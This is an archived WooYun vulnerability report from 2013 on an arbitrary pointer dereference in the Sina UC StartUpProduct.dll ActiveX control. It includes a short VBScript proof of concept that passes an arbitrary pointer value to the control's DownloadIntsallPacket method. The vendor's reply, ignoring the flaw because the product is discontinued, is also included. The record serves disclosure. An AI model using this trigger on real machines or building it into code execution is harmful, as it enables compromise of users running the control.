{"id": 7651, "wybug_id": "wooyun-2013-036883", "wybug_title": "新浪UC StartUpProduct.dll任意指针引用漏洞", "wybug_corp": "新浪", "wybug_author": "n0bele", "wybug_date": "2013-09-12 14:34", "wybug_open_date": "2013-12-08 14:35", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-12：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-08：\t细节向公众公开  简要描述： 见标题 详细说明：  StartUpProduct.dll是一个activex，其中的几个函数都有问题，未对指针进行有效性判断,见图\n\nESI是传入参数，任意传入一个指针即覆盖.winxp下测试\n<?XML version='1.0' standalone='yes' ?><package><job id='DoneInVBS' debug='false' error='true'><object classid='clsid:43D36B68-DB27-4250-A584-F5F5A381C3FE' id='target' /><script language='vbscript'>targetFile = \"C:\\Program Files\\Sina\\SinaUC\\StartUpProduct.dll\"prototype  = \"Sub DownloadIntsallPacket ( ByVal lpData As Long )\"memberName = \"DownloadIntsallPacket\"progid     = \"StartUpProductLib.StartProduct\"argCount   = 1arg1=9target.DownloadIntsallPacket arg1 </script></job></package>\n这里传入的是9，所以就如下图，当然shellcode也很简单了，主要是漏洞比较鸡助。\n\n   漏洞证明：  自己试.   修复方案：  他们懂   版权声明：转载请注明来源 n0bele@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-08 14:35 厂商回复： 经过测试，问题真是存在，但是由于新浪uc已经停止更新，故此忽略，感谢关注新浪 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}